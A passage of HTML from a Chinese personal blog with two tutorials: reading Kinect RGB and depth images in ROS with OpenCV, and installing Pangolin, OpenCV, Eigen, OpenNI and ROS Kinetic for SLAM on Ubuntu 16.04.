-                <time title="Modified: 2020-01-24 22:23:49" itemprop="dateModified" datetime="2020-01-24T22:23:49+08:00">2020-01-24</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="ROS-OpenCV读取图像"><a href="#ROS-OpenCV读取图像" class="headerlink" title="ROS+OpenCV读取图像"></a>ROS+OpenCV读取图像</h1><h2 id="新建一个freenect-launch文件，填入一下内容"><a href="#新建一个freenect-launch文件，填入一下内容" class="headerlink" title="新建一个freenect.launch文件，填入一下内容"></a>新建一个freenect.launch文件，填入一下内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;launch&gt;</span><br><span class="line">	&lt;!-- 启动freenect驱动 --&gt;</span><br><span class="line">	&lt;include file=&quot;$(find freenect_launch)/launch/freenect.launch&quot;&gt;</span><br><span class="line">		&lt;arg name=&quot;publish_tf&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">		&lt;arg name=&quot;depth_registration&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">		&lt;arg name=&quot;rgb_processing&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">		&lt;arg name=&quot;ir_processing&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">		&lt;arg name=&quot;depth_processing&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">		&lt;arg name=&quot;depth_registered_processing&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">		&lt;arg name=&quot;disparity_processing&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">		&lt;arg name=&quot;disparity_registered_processing&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">		&lt;arg name=&quot;sw_registered_processing&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">		&lt;arg name=&quot;hw_registered_processing&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">	&lt;/include&gt;</span><br><span class="line">&lt;/launch&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="在ros下创建工作空间"><a href="#在ros下创建工作空间" class="headerlink" title="在ros下创建工作空间"></a>在ros下创建工作空间</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p cv_ws/src</span><br><span class="line">cd cv_ws/src</span><br><span class="line">catkin_init_workspace</span><br><span class="line">cd ..</span><br><span class="line">catkin_make</span><br></pre></td></tr></table></figure>
-<h2 id="在工作空间下创建程序包"><a href="#在工作空间下创建程序包" class="headerlink" title="在工作空间下创建程序包"></a>在工作空间下创建程序包</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd src</span><br><span class="line">catkin_create_pkg robot_vision roscpp std_msgs cv_bridge image_transport sensor_msgs</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">创建程序包的一般格式是catkin_create_pkg &lt;name&gt; &lt;dependencies package&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="在src-robot-vision-src-目录下创建getImage-cpp"><a href="#在src-robot-vision-src-目录下创建getImage-cpp" class="headerlink" title="在src/robot_vision/src/目录下创建getImage.cpp"></a>在src/robot_vision/src/目录下创建getImage.cpp</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ros/ros.h&gt; //ros标准库头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; //C++标准输入输出库</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  cv_bridge中包含CvBridge库</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cv_bridge/cv_bridge.h&gt; </span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ROS图象类型的编码函数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sensor_msgs/image_encodings.h&gt; </span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   image_transport 头文件用来在ROS系统中的话题上发布和订阅图象消息</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;image_transport/image_transport.h&gt; </span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//OpenCV2标准头文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;opencv2/core/core.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;opencv2/highgui/highgui.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;opencv2/imgproc/imgproc.hpp&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> INPUT = <span class="string">"Input"</span>; <span class="comment">//定义输入窗口名称</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> OUTPUT = <span class="string">"Output"</span>; <span class="comment">//定义输出窗口名称</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> DEPTH = <span class="string">"DEPTH"</span>; <span class="comment">//定义depth窗口名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个转换的类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    ros::NodeHandle nh_; <span class="comment">//定义ROS句柄</span></span><br><span class="line">    image_transport::ImageTransport it_; <span class="comment">//定义一个image_transport实例</span></span><br><span class="line">    image_transport::Subscriber image_sub_0,image_sub_1; <span class="comment">//定义ROS图象接收器</span></span><br><span class="line">    <span class="comment">//image_transport::Publisher image_pub_; //定义ROS图象发布器</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Main()</span><br><span class="line">      :it_(nh_) <span class="comment">//构造函数</span></span><br><span class="line">    &#123;</span><br><span class="line">        image_sub_0 = it_.subscribe(<span class="string">"/camera/rgb/image_raw"</span>, <span class="number">1</span>, &amp;Main::convert_callback, <span class="keyword">this</span>); <span class="comment">//定义图象接受器，订阅话题是“camera/rgb/image_raw”</span></span><br><span class="line">        image_sub_1 = it_.subscribe(<span class="string">"/camera/depth_registered/image_raw"</span>, <span class="number">1</span>, &amp;</span><br><span class="line">        Main::convert_callback_depth, <span class="keyword">this</span>); <span class="comment">//定义图象接受器，订阅话题是“/camera/depth_registered/image_raw”</span></span><br><span class="line">       </span><br><span class="line">       <span class="comment">// image_pub_ = it_.publishe("", 1); //定义图象发布器</span></span><br><span class="line">        <span class="comment">//初始化输入输出窗口</span></span><br><span class="line">        cv::namedWindow(INPUT);</span><br><span class="line">        cv::namedWindow(OUTPUT);</span><br><span class="line">        cv::namedWindow(DEPTH);</span><br><span class="line">    &#125;</span><br><span class="line">    ~Main() <span class="comment">//析构函数</span></span><br><span class="line">    &#123;</span><br><span class="line">         cv::destroyWindow(INPUT);</span><br><span class="line">         cv::destroyWindow(OUTPUT);</span><br><span class="line">         cv::destroyWindow(DEPTH);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      rgb图像的转换会调函数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">convert_callback</span><span class="params">(<span class="keyword">const</span> sensor_msgs::ImageConstPtr&amp; msg)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cv_bridge::CvImagePtr cv_ptr; <span class="comment">// 声明一个CvImage指针的实例</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            cv_ptr =  cv_bridge::toCvCopy(msg, <span class="string">"bgr8"</span>); <span class="comment">//将ROS消息中的图象信息提取，生成新cv类型的图象，复制给CvImage指针</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(cv_bridge::Exception&amp; e)  <span class="comment">//异常处理</span></span><br><span class="line">        &#123;</span><br><span class="line">            ROS_ERROR(<span class="string">"cv_bridge exception: %s"</span>, e.what());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        image_process(cv_ptr-&gt;image); <span class="comment">//得到了cv::Mat类型的图象，在CvImage指针的image中，将结果传送给处理函数   </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      depth图像的转换会调函数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">convert_callback_depth</span><span class="params">(<span class="keyword">const</span> sensor_msgs::ImageConstPtr&amp; msg)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cv_bridge::CvImagePtr cv_ptr; <span class="comment">// 声明一个CvImage指针的实例</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            cv_ptr =  cv_bridge::toCvCopy(msg, sensor_msgs::image_encodings::TYPE_16UC1); <span class="comment">//将ROS消息中的图象信息提取，生成新cv类型的图象，复制给CvImage指针</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(cv_bridge::Exception&amp; e)  <span class="comment">//异常处理</span></span><br><span class="line">        &#123;</span><br><span class="line">            ROS_ERROR(<span class="string">"cv_bridge exception: %s"</span>, e.what());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        imshow(DEPTH,cv_ptr-&gt;image); <span class="comment">//得到了cv::Mat类型的图象，在CvImage指针的image中，将结果传送给处理函数   </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       这是图象处理的主要函数，一般会把图像处理的主要程序写在这个函数中。这里的例子只是一个彩色图象到灰度图象的转化</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">image_process</span><span class="params">(cv::Mat img)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       cv::Mat img_out;</span><br><span class="line">       cv::cvtColor(img, img_out, CV_RGB2GRAY);  <span class="comment">//转换成灰度图象</span></span><br><span class="line">       cv::imshow(INPUT, img);</span><br><span class="line">       cv::imshow(OUTPUT, img_out);</span><br><span class="line">       cv::waitKey(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ros::init(argc, argv, <span class="string">"RGB"</span>);</span><br><span class="line">    Main obj;</span><br><span class="line">    ros::spin();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>将ROS消息中的图象信息提取，生成新cv类型的图象，复制给CvImage指针<ul>
-<li>cv_ptr =  cv_bridge::toCvCopy(msg, “bgr8”);</li>
-<li>cv_ptr =  cv_bridge::toCvCopy(msg, sensor_msgs::image_encodings::TYPE_16UC1);</li>
-<li>第二个参数表示转换的类型<ul>
-<li>mono8: CV_8UC1, grayscale image</li>
-<li>mono16: CV_16UC1, 16-bit grayscale image</li>
-<li>bgr8: CV_8UC3, color image with blue-green-red color order</li>
-<li>rgb8: CV_8UC3, color image with red-green-blue color order</li>
-<li>bgra8: CV_8UC4, BGR color image with an alpha channel</li>
-<li>rgba8: CV_8UC4, RGB color image with an alpha channel</li>
-</ul>
-</li>
-<li>cv_ptr-&gt;image转化成cv::Mat类型</li>
-</ul>
-</li>
-<li>ros图片路径<ul>
-<li>rgb图片：/camera/rgb/image_raw</li>
-<li>深度图片：/camera/depth_registered/image_raw</li>
-</ul>
-</li>
-</ul>
-<h2 id="向src-robot-vision-CMakeLists-txt添加如下内容"><a href="#向src-robot-vision-CMakeLists-txt添加如下内容" class="headerlink" title="向src/robot_vision/CMakeLists.txt添加如下内容"></a>向src/robot_vision/CMakeLists.txt添加如下内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FIND_PACKAGE(OpenCV REQUIRED)</span><br><span class="line">include_directories($&#123;OpenCV_INCLUDE_DIRS&#125;)</span><br><span class="line">add_executable(getImage src/getImage.cpp)</span><br><span class="line">target_link_libraries(getImage $&#123;catkin_LIBRARIES&#125; $&#123;OpenCV_LIBS&#125;)</span><br><span class="line">add_dependencies(getImage robot_vision_generate_messages_cpp)</span><br></pre></td></tr></table></figure>
-<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><ul>
-<li>返回根目录</li>
-<li>终端输入<blockquote>
-<p>catkin_make</p>
-</blockquote>
-</li>
-</ul>
-<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><ul>
-<li>将节点导入bash，在终端输入<blockquote>
-<p>source ./devel/setup.bash</p>
-</blockquote>
-</li>
-<li>打开另一个终端进入之前创建的freenect.launch目录，输入<blockquote>
-<p>roslaunch freenect.launch</p>
-</blockquote>
-</li>
-<li>在终端输入运行(rosrun 包名 节点名)<blockquote>
-<p>rosrun robot_vision getImage</p>
-</blockquote>
-</li>
-</ul>
-<p>参考博客</p>
-<ul>
-<li><a href="https://blog.csdn.net/qq_31918961/article/details/93092640" target="_blank" rel="noopener">https://blog.csdn.net/qq_31918961/article/details/93092640</a></li>
-<li><a href="https://blog.csdn.net/u010925447/article/details/80033288" target="_blank" rel="noopener">https://blog.csdn.net/u010925447/article/details/80033288</a></li>
-<li><a href="https://blog.csdn.net/danwuxie/article/details/86708805" target="_blank" rel="noopener">https://blog.csdn.net/danwuxie/article/details/86708805</a></li>
-<li><a href="https://blog.csdn.net/u013794793/article/details/79925491" target="_blank" rel="noopener">https://blog.csdn.net/u013794793/article/details/79925491</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/06/Ubuntu1604-SLAM-kinectv1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="kaneiki wang">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xkaneiki's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/07/06/Ubuntu1604-SLAM-kinectv1/" class="post-title-link" itemprop="url">Ubuntu1604+SLAM+kinectv1</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-07-06 21:26:54" itemprop="dateCreated datePublished" datetime="2019-07-06T21:26:54+08:00">2019-07-06</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-01-27 13:05:45" itemprop="dateModified" datetime="2020-01-27T13:05:45+08:00">2020-01-27</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Ubuntu1604-SLAM-kinectv1"><a href="#Ubuntu1604-SLAM-kinectv1" class="headerlink" title="Ubuntu1604+SLAM+kinectv1"></a>Ubuntu1604+SLAM+kinectv1</h1><h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><blockquote>
-<p>sudo apt-get install cmake git</p>
-<p>sudo apt-get install gcc g++</p>
-</blockquote>
-<h2 id="Boost安装"><a href="#Boost安装" class="headerlink" title="Boost安装"></a>Boost安装</h2><blockquote>
-<p>sudo apt-get install libboost-all-dev</p>
-</blockquote>
-<h2 id="安装Pangolin"><a href="#安装Pangolin" class="headerlink" title="安装Pangolin"></a>安装Pangolin</h2><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><h4 id="OpenGL"><a href="#OpenGL" class="headerlink" title="OpenGL"></a>OpenGL</h4><blockquote>
-<p>sudo apt install libgl1-mesa-dev</p>
-<h4 id="Glew"><a href="#Glew" class="headerlink" title="Glew"></a>Glew</h4><p>sudo apt install libglew-dev</p>
-<h3 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h3><p>git clone <a href="https://github.com/stevenlovegrove/Pangolin.git" target="_blank" rel="noopener">https://github.com/stevenlovegrove/Pangolin.git</a> </p>
-<h3 id="修改源码"><a href="#修改源码" class="headerlink" title="修改源码"></a>修改源码</h3></blockquote>
-<p><strong><em>注意这里是必要操作确保Pangolin之后可用</em></strong></p>
-<h4 id="打开相应的源码文件"><a href="#打开相应的源码文件" class="headerlink" title="打开相应的源码文件"></a>打开相应的源码文件</h4><blockquote>
-<p>gedit Path_To_Pangolin/Pangolin/src/display/device/display_x11.cpp</p>
-<h4 id="将文件中对应代码修改成如下形式"><a href="#将文件中对应代码修改成如下形式" class="headerlink" title="将文件中对应代码修改成如下形式"></a>将文件中对应代码修改成如下形式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// Desired attributes</span><br><span class="line">    static int visual_attribs[] =</span><br><span class="line">    &#123;</span><br><span class="line">        GLX_X_RENDERABLE    , True,</span><br><span class="line">        GLX_DRAWABLE_TYPE   , GLX_WINDOW_BIT,</span><br><span class="line">        GLX_RENDER_TYPE     , GLX_RGBA_BIT,</span><br><span class="line">        GLX_X_VISUAL_TYPE   , GLX_TRUE_COLOR,</span><br><span class="line">        GLX_RED_SIZE        , 8,</span><br><span class="line">        GLX_GREEN_SIZE      , 8,</span><br><span class="line">        GLX_BLUE_SIZE       , 8,</span><br><span class="line">        GLX_ALPHA_SIZE      , 8,</span><br><span class="line">        GLX_DEPTH_SIZE      , 24,</span><br><span class="line">        GLX_STENCIL_SIZE    , 8,</span><br><span class="line">        GLX_DOUBLEBUFFER    , glx_doublebuffer ? False : False,</span><br><span class="line">        //GLX_SAMPLE_BUFFERS  , glx_sample_buffers,</span><br><span class="line">        //GLX_SAMPLES         , glx_sample_buffers &gt; 0 ? glx_samples : 0,</span><br><span class="line">        None</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><blockquote>
-<p>cd Pangolin</p>
-<p>mkdir build </p>
-<p>cd build </p>
-<p>cmake .. </p>
-<p>make -j2</p>
-<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>sudo make install</p>
-</blockquote>
-<h2 id="安装OpenCV3-2-0"><a href="#安装OpenCV3-2-0" class="headerlink" title="安装OpenCV3.2.0"></a>安装OpenCV3.2.0</h2><h3 id="安装依赖-1"><a href="#安装依赖-1" class="headerlink" title="安装依赖"></a>安装依赖</h3><blockquote>
-<p>sudo apt-get install build-essential</p>
-<p>sudo apt-get install cmake git libgtk2.0-dev pkg-config libavcodec-dev libavformat-dev libswscale-dev</p>
-<p>sudo apt-get install python-dev python-numpy libtbb2 libtbb-dev libjpeg-dev libpng-dev libtiff-dev libjasper-dev libdc1394-22-dev</p>
-</blockquote>
-<h3 id="下载OpenCV3-2-0的文件包"><a href="#下载OpenCV3-2-0的文件包" class="headerlink" title="下载OpenCV3.2.0的文件包"></a>下载OpenCV3.2.0的文件包</h3><blockquote>
-<p>去官网下载（考验网速的时候）</p>
-<h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><p>cd OpenCV3.2.0</p>
-<p>mkdir build</p>
-<p>cd build</p>
-<p>cmake ..</p>
-<p>make -j</p>
-<p>sudo make install</p>
-<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><h4 id="终端输入"><a href="#终端输入" class="headerlink" title="终端输入"></a>终端输入</h4><p>pkg-config —cflags —libs opencv</p>
-</blockquote>
-<h4 id="显示如下信息表示安装成功"><a href="#显示如下信息表示安装成功" class="headerlink" title="显示如下信息表示安装成功"></a>显示如下信息表示安装成功</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-I/usr/local/include/opencv -I/usr/local/include -L/usr/local/lib -lopencv_shape -lopencv_stitching -lopencv_objdetect -lopencv_superres -lopencv_videostab -lopencv_calib3d -lopencv_features2d -lopencv_highgui -lopencv_videoio -lopencv_imgcodecs -lopencv_video -lopencv_photo -lopencv_ml -lopencv_imgproc -lopencv_flann -lopencv_viz -lopencv_core</span><br></pre></td></tr></table></figure>
-<h2 id="安装Eigen3"><a href="#安装Eigen3" class="headerlink" title="安装Eigen3"></a>安装Eigen3</h2><blockquote>
-<p>sudo apt-get install libeigen3-dev</p>
-<p>sudo cp -r /usr/local/include/eigen3/Eigen /usr/local/include </p>
-</blockquote>
-<h2 id="kinectv1驱动安装"><a href="#kinectv1驱动安装" class="headerlink" title="kinectv1驱动安装"></a>kinectv1驱动安装</h2><h3 id="OpenNI"><a href="#OpenNI" class="headerlink" title="OpenNI"></a>OpenNI</h3><h4 id="安装依赖-2"><a href="#安装依赖-2" class="headerlink" title="安装依赖"></a>安装依赖</h4><blockquote>
-<p>sudo apt-get install git build-essential python libusb-1.0-0-dev freeglut3-dev openjdk-8-jdk</p>
-<p>sudo apt-get install doxygen graphviz mono-complete</p>
-<h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>git clone <a href="https://github.com/OpenNI/OpenNI.git" target="_blank" rel="noopener">https://github.com/OpenNI/OpenNI.git</a></p>
-<p>cd OpenNI</p>
-<p>git checkout Unstable-1.5.4.0</p>
-<p>cd Platform/Linux/CreateRedist</p>
-<p>chmod +x RedistMaker</p>
-<p>./RedistMaker</p>
-<p>cd ../Redist/OpenNI-Bin-Dev-Linux-[xxx]  (where [xxx] is your architecture and this particular OpenNI release)</p>
-<p>sudo ./install.sh</p>
-<h3 id="Kinect-Sensor"><a href="#Kinect-Sensor" class="headerlink" title="Kinect Sensor"></a>Kinect Sensor</h3><p>git clone <a href="https://github.com/avin2/SensorKinect" target="_blank" rel="noopener">https://github.com/avin2/SensorKinect</a></p>
-<p>cd SensorKinect</p>
-<p>cd Platform/Linux/CreateRedist</p>
-<p>chmod +x RedistMaker</p>
-<p>./RedistMaker</p>
-<p>cd ../Redist/Sensor-Bin-Linux-[xxx] (where [xxx] is your architecture and this particular OpenNI release)  </p>
-<p>chmod +x install.sh</p>
-<p>sudo ./install.sh</p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>cd OpenNI/Platform/Linux/Bin/x64-Release/NiViewer</p>
-<p>./NiViewer</p>
-<p>运行结果为深黄色图像</p>
-</blockquote>
-<h2 id="安装ROS"><a href="#安装ROS" class="headerlink" title="安装ROS"></a>安装ROS</h2><h3 id="按照官网步骤如下命令逐条运行"><a href="#按照官网步骤如下命令逐条运行" class="headerlink" title="按照官网步骤如下命令逐条运行"></a>按照官网步骤如下命令逐条运行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &apos;echo &quot;deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main&quot; &gt; /etc/apt/sources.list.d/ros-latest.list&apos;</span><br><span class="line">sudo apt-key adv --keyserver &apos;hkp://keyserver.ubuntu.com:80&apos; --recv-key C1CF6E31E6BADE8868B172B4F42ED6FBAB17C654</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ros-kinetic-desktop-full</span><br><span class="line">apt-cache search ros-kinetic(查看可用的安装包)</span><br><span class="line">sudo rosdep init</span><br><span class="line">rosdep update</span><br><span class="line">echo &quot;source /opt/ros/kinetic/setup.bash&quot; &gt;&gt; ~/.bashrc</span><br><span class="line">source ~/.bashrc</span><br><span class="line">sudo apt install python-rosinstall python-rosinstall-generator python-wstool build-essential</span><br></pre></td></tr></table></figure>
-<h3 id="安装及测试驱动"><a href="#安装及测试驱动" class="headerlink" title="安装及测试驱动"></a>安装及测试驱动</h3><blockquote>
-<p>sudo apt-get install libfreenect-dev</p>
-<h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>sudo apt-get install ros-kinetic-openni-camera</p>
-<p>sudo apt-get install ros-kinetic-openni-launch</p>
-<p>rosstack profile</p>
-<p>rospack profile</p>
